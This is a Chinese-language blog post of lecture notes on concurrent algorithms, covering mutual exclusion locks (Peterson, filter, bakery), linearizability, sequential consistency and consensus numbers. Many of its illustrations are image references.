<h1 id="class-5"><a href="#class-5" class="headerlink" title="class-5"></a>class-5</h1><p>讲并发算法</p>
<p>关注算法的正确性，可以被设计出来之类，不关心效率</p>
<p>-</p>
<p>互斥问题</p>
<p>Mutual Exclusion</p>
<p>事件：</p>
<ol>
<li>瞬时发生，不可能有1点半发生到2点这种事情</li>
<li>一个时间只能有一个事件产生，事件间一定有先后关系（a0-&gt;a1代表a0先于a1发生）</li>
</ol>
<p>method被call，被return也是事件</p>
<p>-</p>
<p>线程就像状态机，事件是transitions</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210926082403890.png" alt="image-20210926082403890" style="zoom:80%;"></p>
<p>-</p>
<p>时间区间：一个事件到下一个事件之间</p>
<p>时间区间也有先后关系，A的终止事件在B的起始事件之前，A-&gt;B</p>
<p>这是偏序的：</p>
<p>非自反：A-&gt;A不可以</p>
<p>非对称：A-&gt;B就不会B-&gt;A</p>
<p>传递：A-&gt;B,B-&gt;C  =&gt; A-&gt;C</p>
<p>但，A和B之间可以既没有A-&gt;B也没有B-&gt;A，所以不是全序（时间区间可以互相覆盖）</p>
<p>-</p>
<p>但事件本身之间是全序的（事件一定有先后顺序）</p>
<p>-</p>
<h2 id="mutual-exclusion"><a href="#mutual-exclusion" class="headerlink" title="mutual exclusion"></a>mutual exclusion</h2><p>定义</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210926085020309.png" alt="image-20210926085020309"></p>
<p>目标：线程i的第k次访问临界区，与，线程j的第m次访问临界区，一定有先后关系</p>
<p>-</p>
<p>deadlock-freedom vs starvation-freedom</p>
<p>死锁free：一个线程lock完就不解锁了，导致所有线程都lock了</p>
<p>starvation free：一些线程lock完，在一些条件下才能unlock</p>
<p>形式上，while类型的程序才能出现这两种情况</p>
<p>-</p>
<p>mutual exclusion和deadlock-freedom，starvation-freedom有什么关系？</p>
<ul>
<li>me只要求不出现同时访问临界区即可（反证法）</li>
<li>df要求没有死锁</li>
<li>sf要求总能排到</li>
<li>有的算法可以满足me但不满足df/sf</li>
<li>sf是比df更强的性质</li>
</ul>
<p>page81的lockone算法好奇怪，被证明是me的？然后又存在deadlock？？—现在看来不奇怪了</p>
<p>locktwo，如果只有一个线程的话，就一直锁住里面了</p>
<p>-</p>
<p>然后引出了两者的结合，peterson算法</p>
<p>flag表达自己想进临界区的意愿，victim=i表示自己愿意等</p>
<p>deadlock-free证明：</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210926092747601.png" alt="image-20210926092747601"></p>
<p>也可以保证starvation-free：</p>
<p>一个线程如果想进入临界区，那他一定可以进入临界区</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210926093047988.png" alt="image-20210926093047988"></p>
<p>-</p>
<p>下面扩展到n&gt;2个线程上去</p>
<p>filter lock， bakery lock</p>
<p>-</p>
<h2 id="fliter-lock"><a href="#fliter-lock" class="headerlink" title="fliter lock"></a>fliter lock</h2><p>想象一个房子有n层，n个线程想到达第n层。进去时候，一个线程留着1楼，一个线程留在2楼……最后只有一个线程进入第n层</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210926093526192.png" alt="image-20210926093526192"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210926094227159.png" alt="image-20210926094227159"></p>
<p>-</p>
<h1 id="class-6"><a href="#class-6" class="headerlink" title="class-6"></a>class-6</h1><p>继续filter lock</p>
<p>锁的时候，线程i想进入下一层，然后把victim设为自己，去看看是否存在也想进入更高层的线程k，并且victim还是自己，就锁着</p>
<p>Q：为什么是level[k]&gt;=L而不是level[k]==i</p>
<p>A：这样就不符合me了。如果有线程a到达了L层，下一次循环想到达L+1，但本身还位于L层，此时新来2个线程bc想到达L层，b看victim是c，就到达了L层，然后和a冲突了。</p>
<p>-</p>
<h3 id="证明filter-lock是me的："><a href="#证明filter-lock是me的：" class="headerlink" title="证明filter lock是me的："></a>证明filter lock是me的：</h3><p>目标是证明只有1个线程能抵达n-1层，我们证一下对于第L层，只有n-L个线程能到达L层</p>
<p>递推一下，对于第L-1层，只有n-L+1个线程能到达第L-1层</p>
<p>假设这些想往L层走的线程里，A是最后一个设置victim[L]=A的，其他线程之一称为B（L&lt;=n-1，所以n-L+1&gt;=2，肯定是有B的）</p>
<p>W_B level[B] = L -&gt;</p>
<p>W_B victim[B] = B -&gt;</p>
<p>W_A victim[A] = A-&gt;</p>
<p>R_A level[B]</p>
<p>所以A读到了level[B]&gt;=L，并且victim=A，所以A去不了第L层，而其他的B都能踩着victimA上去到L层</p>
<p>-</p>
<h3 id="证明filter-lock是starvation-free的："><a href="#证明filter-lock是starvation-free的：" class="headerlink" title="证明filter lock是starvation free的："></a>证明filter lock是starvation free的：</h3><p>书上讲的有点稀碎，不看了</p>
<p>-</p>
<p>引出一种更强的性质：bounded waitingg</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210929085215599.png" alt="image-20210929085215599" style="zoom:80%;"></p>
<p>-</p>
<p>r-bounded waiting指的是，线程A第k次想进入临界区的行为中，DA k早于线程B第j次想进入临界区的DB j，然后WA和WB可能产生并发，然后B进入临界区后又来想继续进入临界区r次，最后的结果满足CSA k早于CS j+r</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210929085708499.png" alt="image-20210929085708499"></p>
<p>-</p>
<p>fliter lock满足sf，但对于任何r都不满足r-bounded</p>
<p>为啥呢？</p>
<p>因为sf的要求低，只要对于每一个执行的线程都能进入CS</p>
<p>但r-bounded要求对于任何情况，r都生效</p>
<p>-</p>
<p>解决不满足r-bounded问题，引出bakery algorithm</p>
<h2 id="Bakery-lock"><a href="#Bakery-lock" class="headerlink" title="Bakery lock"></a>Bakery lock</h2><p>类似于银行取号，先拿个号，然后等比自己小的都服务完了，然后再自己上</p>
<p>不一定是字典序的号，只要有一个全序即可</p>
<p>初始化部分如下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210929091510053.png" alt="image-20210929091510053" style="zoom:80%;"></p>
<p>lock部分如下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210929091138281.png" alt="image-20210929091138281"></p>
<p>Q：max不是原子操作，可能存在两个线程，取到同一个号，这时候用线程id去辅助比较</p>
<p>unlock部分只把flag置为false，不去管label，所以label只会一直涨，保证没有重复（除非取到一个号）</p>
<p>-</p>
<h3 id="满足me的证明："><a href="#满足me的证明：" class="headerlink" title="满足me的证明："></a>满足me的证明：</h3><p>读label[0]~label[n-1]，写label[i]，再次读label[k]，有时间顺序</p>
<p>如果AB同时进入临界区，假设同时进入的时候，label[A]&lt;label[B]</p>
<p>当B进入临界区时，while条件为假，那么flag[A] = false或者flag[A] == true &amp;&amp; label[B] &lt; label[A]</p>
<p>但是呢，已经假设过了，label[A] &lt; label[B]，所以只能是flag[A] = false</p>
<p>既然flag[A] = false，那么有以下先后顺序推理</p>
<p>W_B label[B] -&gt; R_B flag[A] -&gt; W_A label[A]</p>
<p>即B的取号早于A，label[B] &lt; label[A]，与假设矛盾</p>
<p>-</p>
<h3 id="证明fcfs："><a href="#证明fcfs：" class="headerlink" title="证明fcfs："></a>证明fcfs：</h3><p>目标是当DA-&gt;DB时，CSA-&gt;CSB</p>
<p>DA-&gt;DB，说明label[A] &lt; label[B]</p>
<p>W_A flag[A] -&gt;</p>
<p>W_A label[A] -&gt;</p>
<p>R_B label[A] -&gt;</p>
<p>W_B label[B] -&gt;</p>
<p>R_B flag[A]</p>
<p>所以B进入临界区时能看到 flag[A] = true，label[A] &lt; label[B]而被锁在门外，是A先进入临界区的。或者看到flag[A] = false而进入临界区，而此时A也已经退出临界区了</p>
<p>。。。</p>
<p>-</p>
<p>label一直增长，整数溢出了怎么办？</p>
<p>注意到不需要字典序，只需要有一个全序去标注label就行了</p>
<h1 id="class-7"><a href="#class-7" class="headerlink" title="class-7"></a>class-7</h1><p>接上文，那么最好构造一个系统，同时满足不饥饿，并发，时间戳，不溢出</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019160958953.png" alt="image-20211019160958953"></p>
<p>-</p>
<p>一个有序的设计如下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019161041636.png" alt="image-20211019161041636"></p>
<p>-</p>
<p>两个线程的序可以用3个节点的环来表示，并非全序，因为不满足传递性（1 dominate 0，0 dominate 2，但不满足 1 dominate 2）</p>
<p>这就是不能只有2个节点的原因：1 dominate 2，2 dominate 1，乱掉啦。需要引入第三个节点来缓冲下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019161149779.png" alt="image-20211019161149779"></p>
<p>-</p>
<p>三个线程的，把维度升高</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019161249751.png" alt="image-20211019161249751"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019161258467.png" alt="image-20211019161258467"></p>
<p>处理K个线程的话需要3^(k-1)个节点</p>
<p>用bit来表示这个数字要log_2^(3^(k-1))个bit位</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019165652394.png" alt="image-20211019165652394"></p>
<p>-</p>
<h3 id="对bakery-lock的思考："><a href="#对bakery-lock的思考：" class="headerlink" title="对bakery lock的思考："></a>对bakery lock的思考：</h3><p>既然他是如此的，高效，优雅，公平，为啥不实用？</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019165830305.png" alt="image-20211019165830305"></p>
<p>TODO啥意思</p>
<h2 id="shared-memory-问题的通用性质"><a href="#shared-memory-问题的通用性质" class="headerlink" title="shared memory 问题的通用性质"></a>shared memory 问题的通用性质</h2><p>如何解决MRSW？多个读一个写，表达意愿，需要设置flag</p>
<p>如何解决MRMW？多个读多个写，谦让一下，需要设置victim</p>
<p>flag[]和victim[]称为寄存器</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019170216046.png" alt="image-20211019170216046"></p>
<h3 id="定理1"><a href="#定理1" class="headerlink" title="定理1"></a>定理1</h3><p>要解决MRSW问题，保证mutual exclusion和deadlock-free，至少需要N个flag</p>
<p>假设只用小于N个，那没法确定A在不在临界区</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211019170559788.png" alt="image-20211019170559788"></p>
<p>上限也顶多需要2N个寄存器，参考bakery alg</p>
<h3 id="定理2"><a href="#定理2" class="headerlink" title="定理2"></a>定理2</h3><p>如果现在是考虑MRMW寄存器，至少需要N个</p>
<p>（发现Writer无论是不是Multiple，都不起作用嗷）</p>
<p>少于N个的时候，B停在要写R_B的前一刻，A进程先进入CS，然后B继续跑，A进程留给R_B R_C的痕迹会被B抹掉，C一看哦豁CS空了，那我就进去了，于是AC同时处于CS了</p>
<p>-</p>
<p>总结</p>
<p>1960s提出了很多不正确的解决me和df的算法</p>
<p>N个ReadWrite-Registers不高效，因为write会cover old write</p>
<p>需要更强的硬件操作来避免covering问题（下节课的内容）</p>
<p>-</p>
<p>如何定义并发算法的正确性？</p>
<h2 id="safety和liveness的对比"><a href="#safety和liveness的对比" class="headerlink" title="safety和liveness的对比"></a>safety和liveness的对比</h2><p>safety是有限步内能检测的性质，liveness无法有限步检测出来</p>
<p>safety认为：如果坏事发生，那么在之前已经发生。如果没有坏事发生，只有当所有前缀都不发生坏事时才成立</p>
<p>liveness认为：不管前面发生了什么事，现在发生了一件好事，那之后还会再次发生好事</p>
<p>mutual exclusion，bounded overtaking都是safety的，（只要发生了一次坏事，比如两个进程进CS了，被抢了不止r次，那就完了）</p>
<p>starvation free，deadlock free都是liveness的（即使单个线程饿了好久，但只要别饿到死，最终能进CS，就可以了）</p>
<p>-</p>
<h1 id="class-8"><a href="#class-8" class="headerlink" title="class-8"></a>class-8</h1><h2 id="并发对象的实现探索，queue为例"><a href="#并发对象的实现探索，queue为例" class="headerlink" title="并发对象的实现探索，queue为例"></a>并发对象的实现探索，queue为例</h2><p>如果要实现一个mutual exclusive的queue，最简单的办法是在enq和deq的时候加锁释放锁</p>
<p>假如不让用锁呢？</p>
<p>简化一下，只有两个线程，一个只做enq，一个只做deq，这样是一个生产者消费者模型</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020113929771.png" alt="image-20211020113929771"></p>
<p>-</p>
<h2 id="如何定义并发对象实现的正确性？"><a href="#如何定义并发对象实现的正确性？" class="headerlink" title="如何定义并发对象实现的正确性？"></a>如何定义并发对象实现的正确性？</h2><p>首先来看顺序执行的对象，有状态</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020111421669.png" alt="image-20211020111421669"></p>
<p>-</p>
<p>例如队列，出队操作，precondition可能是队列为空或者队列不为空，分开讨论</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020111809100.png" alt="image-20211020111809100"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020111837374.png" alt="image-20211020111837374"></p>
<p>-</p>
<p>再看看并发算法</p>
<p>方法调用要花时间（这页干嘛的？噢噢，串行程序花时间不care，因为是一个接一个，并发程序就要考虑重叠了）</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020112400077.png" alt="image-20211020112400077"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020112533916.png" alt="image-20211020112533916"></p>
<p>-</p>
<p>对比一下</p>
<p>串行程序互不打扰，新增方法不影响老方法；并发程序互相干扰，新增方法干扰老方法。</p>
<p>串行程序有状态，并发程序时间重叠</p>
<p>串行程序的方法可以单独描述，并发程序要考虑所有可能的执行次序</p>
<p>-</p>
<h2 id="如何确定并发对象是对的呢？"><a href="#如何确定并发对象是对的呢？" class="headerlink" title="如何确定并发对象是对的呢？"></a>如何确定并发对象是对的呢？</h2><p><img src="/2021/11/18/并发算法与理论笔记/image-20211020113131830.png" alt="image-20211020113131830"></p>
<h2 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h2><p><img src="/2021/11/18/并发算法与理论笔记/image-20211020113203515.png" alt="image-20211020113203515"></p>
<p>-</p>
<p>lock unlock可以保证enq的绿色部分和deq的黄色部分没有重叠</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020121832022.png" alt="image-20211020121832022"></p>
<p>-</p>
<h2 id="linearizability"><a href="#linearizability" class="headerlink" title="linearizability"></a>linearizability</h2><p>可线性化的性质，线性一致性</p>
<p>找一个特殊的时间点（例如上面图里的绿和黄），如果sequential behavior是正确的，那么object就是正确的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020122043262.png" alt="image-20211020122043262"></p>
<p>-</p>
<p>一个valid的例子</p>
<p>规划一下，先enq(x)，再enq(y)，再deq(x)，再deq(y)，是满足的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020122925196.png" alt="image-20211020122925196"></p>
<p>一个invliad的例子，整个enq(x)早于enq(y)，所以不可能先deq出y</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020123015745.png" alt="image-20211020123015745"></p>
<p>-</p>
<p>又一个例子，linearizability不关心method是否结束，所以这个例子是ok的。</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020123124360.png" alt="image-20211020123124360"></p>
<p>-</p>
<p>enq deq都是并发的情况，答案不唯一</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020123404858.png" alt="image-20211020123404858"></p>
<p>-</p>
<p>换个模型，这个invalid</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020123507386.png" alt="image-20211020123507386"></p>
<p>-即使红色的read(1)也是做不到的<img src="/2021/11/18/并发算法与理论笔记/image-20211020123728653.png" alt="image-20211020123728653"></p>
<p>-但read2就是可以做到的</p>
<p>-</p>
<p>现在问题就是，如何找出method里这个特殊的，起决定性作用的点？（linearization point）</p>
<p>-一些例子可以找，但是还有些例子和具体执行相关</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020124233780.png" alt="image-20211020124233780"></p>
<p>-</p>
<h3 id="invocation-amp-response"><a href="#invocation-amp-response" class="headerlink" title="invocation &amp; response"></a>invocation &amp; response</h3><p>上面都是例子，现在想正式定义一下linearizability，那得先定义一下什么是execution</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020124720256.png" alt="image-20211020124720256"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020124910104.png" alt="image-20211020124910104"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020124937132.png" alt="image-20211020124937132"></p>
<ul>
<li>知道thread就可以知道这个q是调用谁的了，所以method name是隐含的</li>
</ul>
<p>-</p>
<p>invocation和response要配对</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020155525086.png" alt="image-20211020155525086"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020155536731.png" alt="image-20211020155536731"></p>
<p>-</p>
<p>除此之外，可以做projection，直译是投影</p>
<p>比如H|B，就是保留B线程的内容，剔除A线程的内容</p>
<p>H|q，就是保留对象q的内容，剔除p的内容</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020155641495.png" alt="image-20211020155641495" style="zoom:50%;"></p>
<p>-</p>
<h3 id="complete-subhistory"><a href="#complete-subhistory" class="headerlink" title="complete subhistory"></a>complete subhistory</h3><p>定义complete subhistory</p>
<p>像下图这种没配对的，属于pending invocation，可能生效也可能没生效，要把它丢掉</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020160442073.png" alt="image-20211020160442073"></p>
<p>-</p>
<h3 id="sequential-histories"><a href="#sequential-histories" class="headerlink" title="sequential histories"></a>sequential histories</h3><p>最后也有一个pending，但是没关系，这是顺序的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020160721264.png" alt="image-20211020160721264"></p>
<p>-</p>
<h3 id="well-formed-histories"><a href="#well-formed-histories" class="headerlink" title="well-formed histories"></a>well-formed histories</h3><p><img src="/2021/11/18/并发算法与理论笔记/image-20211020160839112.png" alt="image-20211020160839112"></p>
<p>-</p>
<h3 id="equivalent-histories"><a href="#equivalent-histories" class="headerlink" title="equivalent histories"></a>equivalent histories</h3><p>线程看到的东西是一样的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020161038728.png" alt="image-20211020161038728"></p>
<p>-</p>
<h3 id="sequential-specifications"><a href="#sequential-specifications" class="headerlink" title="sequential specifications"></a>sequential specifications</h3><p>ss就是在说一个单线程单object的history是否legal</p>
<p>legal是怎么定义的。。噢想起来了，就是上面说的，比如enq(3) deq(3)，就是合法，enq(3) deq(99)就是非法，要找出一个顺序让并发object合理</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020163212648.png" alt="image-20211020163212648"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020163244700.png" alt="image-20211020163244700"></p>
<p>-</p>
<h3 id="method的先序关系"><a href="#method的先序关系" class="headerlink" title="method的先序关系"></a>method的先序关系</h3><p>要想把concurrent history map成 sequential history，要满足首先是equivalent的</p>
<p>先序关系precedes的定义：一个method的return，在另一个method的invocation之前</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020163443934.png" alt="image-20211020163443934"></p>
<p>-</p>
<p>非先序关系：有overlap了</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020163626029.png" alt="image-20211020163626029"></p>
<p>-</p>
<p>notation（符号）来表示有先后顺序的method call</p>
<p>这个顺序说是一个偏序吗，我觉得不是，不满足自反性啊，可能是并发这门课里的定义的吧。。（不满足A-&gt;A也行）</p>
<p>如果想要全序，那H得是一个串行的程序</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020171045584.png" alt="image-20211020171045584"></p>
<p>-</p>
<p>以上都是linearizability的铺垫</p>
<p>一个history H，要给他添加pending的response，或者去掉这些pending，变成一个G</p>
<p>然后找出一个legal sequential history S，G要求满足equivalent S，先序关系也要在S上出现</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020164049409.png" alt="image-20211020164049409"></p>
<p>-</p>
<p>解释一下-&gt;G &lt;= -&gt;S</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020164839380.png" alt="image-20211020164839380"></p>
<p>-</p>
<p>注意事项</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020164954703.png" alt="image-20211020164954703"></p>
<p>-</p>
<p>一个例子，其中第一条和最后一条是pending</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020165041002.png" alt="image-20211020165041002"></p>
<p>-</p>
<p>随便选个策略，给A补一个void，把B enq(6)的丢掉</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020165242691.png" alt="image-20211020165242691"></p>
<p>-</p>
<p>只要先enq(4)，再enq(3)就行了</p>
<p>然后看equivalent，看S|A和S|B是不是依然一样，那显然ok，语序没变过嘛</p>
<p>然后看先序关系，线程内部的语序由equivalent保证了，线程之间的呢？</p>
<p>左边的G里面AB间没有先序关系，所以右边的S里怎么搞都行</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020165445908.png" alt="image-20211020165445908"></p>
<p>-</p>
<h2 id="Composability-Theorem"><a href="#Composability-Theorem" class="headerlink" title="Composability Theorem"></a>Composability Theorem</h2><p>重要定理，多个object的时候，只要保证每个object是linearizability的，那么整体就是linearizability</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020165803116.png" alt="image-20211020165803116"></p>
<p>-</p>
<p>这个定理好，好在模块化，拆开考虑各个object即可</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020165921504.png" alt="image-20211020165921504"></p>
<p>-</p>
<p>回过头看看queue的实现，找一下linearization point</p>
<p>lock之后，unlock之前随便找一个点就行了</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211020170147465.png" alt="image-20211020170147465"></p>
<h1 id="class-9"><a href="#class-9" class="headerlink" title="class-9"></a>class-9</h1><h2 id="回顾一下linearizable"><a href="#回顾一下linearizable" class="headerlink" title="回顾一下linearizable"></a>回顾一下linearizable</h2><p>对象的linearizable的定义如下：</p>
<p>linearizable(o, spec) iff</p>
<p>$\forall$ histories(o), linearizable(H,spec)</p>
<p>linearizable(H,spec) iff</p>
<p>$\exist$ G，completion(H, G)</p>
<p>且$\exist$ S，sequential(S)且valid(s, spec)</p>
<p>且$\forall$ A，G|A $\subset$ S|A</p>
<p>且$\rightarrow_G$ $\subseteq$ $\rightarrow_S$</p>
<hr>
<p>整体的linearizable，只要每个部件的linearizable就行</p>
<p>-</p>
<p>但无法枚举所有histories，怎么办？</p>
<p>找程序里的linearization point（LP）</p>
<p>-</p>
<p>有的linearizable的object没有固定的LP，LP依赖于具体的执行（作业A3里提到）</p>
<p>-</p>
<h2 id="sequential-consistency"><a href="#sequential-consistency" class="headerlink" title="sequential consistency"></a>sequential consistency</h2><p>不同于linearizability</p>
<p>method内部的代码不能改</p>
<p>同一个线程的operation顺序不能改</p>
<p>不同线程的不重叠的operation顺序可以改</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027085152729.png" alt="image-20211027085152729"></p>
<p>-</p>
<p>例如，这个例子里， 不是linearizable的，但是把enq(x)和enq(y)位置交换，可以满足，所以是sequential consistent的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027090804099.png" alt="image-20211027090804099"></p>
<p>-</p>
<p>SC没有composability组合性，例如下面，</p>
<p>H|p和H|q都满足SC，但是他俩SC的条件里，p.enq(y)-&gt;p.enq(x)，q.enq(x)-&gt;q.enq(y)</p>
<p>结合已有的顺序p.enq(x)-&gt;q.enq(x)，q.enq(y)-&gt;p.enq(y)，成了环</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027111443817.png" alt="image-20211027111443817"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027111454930.png" alt="image-20211027111454930"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027091550558.png" alt="image-20211027091550558"></p>
<p>-</p>
<p>写自己，读对方，是很多mutual exclsion算法的核心</p>
<p>non-negotiable是不可协商的意思</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027092224221.png" alt="image-20211027092224221"></p>
<p>-</p>
<p>硬件上的SC代价昂贵</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027092431768.png" alt="image-20211027092431768"></p>
<p>-</p>
<p>现代多核处理器，读写内存一般是先读写cache，即使如此也比指令执行要慢</p>
<p>程序员自己设置memory barrier，额外的指令等来做sync</p>
<p>-</p>
<p>linear，这门课以后的算法都用linear作为标准</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027093026675.png" alt="image-20211027093026675"></p>
<p>-</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027094156949.png" alt="image-20211027094156949"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027094216683.png" alt="image-20211027094216683"></p>
<p>-</p>
<h2 id="06-ppt"><a href="#06-ppt" class="headerlink" title="06 ppt"></a>06 ppt</h2><p>wait-free是无锁的</p>
<p>怎么实现呢</p>
<p>像环形FIFO queue，无锁</p>
<p>-</p>
<p>共识</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027095027317.png" alt="image-20211027095027317"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211027095008829.png" alt="image-20211027095008829"></p>
<p>-</p>
<h1 id="class-10"><a href="#class-10" class="headerlink" title="class-10"></a>class-10</h1><h2 id="consensus"><a href="#consensus" class="headerlink" title="consensus"></a>consensus</h2><p>寻找一个新问题，叫consensus：多个线程决定一个输入的问题，达成共识。</p>
<p>-</p>
<p>consensus有性质：不能被register实现</p>
<p>但consensus可以被queue实现，所以推理出queue不能被register实现？</p>
<p>-</p>
<p>consensus作为一个中间人，上面的queue可以换成其他对象object，如果能证明object能实现consensus，那就能证明register不能实现object</p>
<p>-</p>
<p>consensus的核心是一个decide(v)函数，要求先写（写指的是propose函数）的人返回自己写的值，后调用的人返回对方写的值</p>
<p>下面看看这些object都可以是哪些</p>
<h2 id="FIFO-x-consensus"><a href="#FIFO-x-consensus" class="headerlink" title="FIFO x consensus"></a>FIFO x consensus</h2><p><img src="/2021/11/18/并发算法与理论笔记/image-20211103082015878.png" alt="image-20211103082015878"></p>
<p>只针对两个线程的情况即可证明</p>
<p>思路这样，红球先被拿出来，黑球后被拿出来。所以拿到黑球的thread就知道，对方已经propose value了，然后才拿到红球，所以自己decide读到对方的value，很正确。</p>
<p>这个核心在于先propose，再取球</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117115701582.png" alt="image-20211117115701582"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103082213094.png" alt="image-20211103082213094"></p>
<p>-</p>
<h2 id="consensus-number"><a href="#consensus-number" class="headerlink" title="consensus number"></a>consensus number</h2><p>定义，如果一个object（附加若干寄存器）可以解决n-thread的consensus，并且不能解决n+1-thread，那就说他的consensus nmber是n</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103082623510.png" alt="image-20211103082623510"></p>
<p>-</p>
<p>一些性质：</p>
<ul>
<li>如果能用X实现Y，那么cn(Y) &gt;= cn(X)</li>
<li>如果cn(Y) &gt; cn(X)，那么不可能用Y实现wait-free的X</li>
</ul>
<p>-</p>
<h2 id="mutiple-assignment-x-FIFO"><a href="#mutiple-assignment-x-FIFO" class="headerlink" title="mutiple assignment x FIFO"></a>mutiple assignment x FIFO</h2><p>mutiple assignment不能用register实现</p>
<p>multiple assignment：多个线程同时对数组里的多个元素进行写</p>
<p>3个元素的数组，A线程写a[0]和a[1]，B线程写a[1]和a[2]</p>
<p>-</p>
<p>思路，来的thread，assgin过后，看看对方该写的a[0]（或者a[2]）是不是空，或者对方写的a[1]和自己一样，是的话就自己是先来的，返回自己写的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103090052046.png" alt="image-20211103090052046"></p>
<p>-</p>
<h2 id="read-modify-write-object"><a href="#read-modify-write-object" class="headerlink" title="read-modify-write object"></a>read-modify-write object</h2><p>原子地：读旧值，更新旧值，返回旧值</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103090520210.png" alt="image-20211103090520210"></p>
<p>-</p>
<p>例子</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103090653080.png" alt="image-20211103090653080"></p>
<p>-</p>
<p>例子</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103091047609.png" alt="image-20211103091047609"></p>
<p>rmw的consensus number是多少呢？</p>
<p>-</p>
<p>首先定义什么是non-trival的rmw</p>
<p>non-trival就是存在一个v，使得v != mumble(v)</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103091435252.png" alt="image-20211103091435252"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103091452300.png" alt="image-20211103091452300"></p>
<p>-</p>
<p>结论</p>
<p>non-trivial RMW的consensus number至少有2</p>
<p>-</p>
<p>思路：thread来了之后get一下旧值，更新一下non-trivial新值，如果得到的旧值和初始值一样，那就说明我是第一个来的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103092134507.png" alt="image-20211103092134507"></p>
<p>-</p>
<p>有两种mumble function的consensus number就是2，这两种分别是</p>
<ul>
<li>commute型</li>
<li>overwrtie型</li>
</ul>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103092909820.png" alt="image-20211103092909820"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103092945548.png" alt="image-20211103092945548"></p>
<p>-</p>
<p>但是，compareAndSet(expect, update)就比较厉害，他的consensus number是无穷大，实现如下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103093348598.png" alt="image-20211103093348598"></p>
<p>-</p>
<p>证明如下</p>
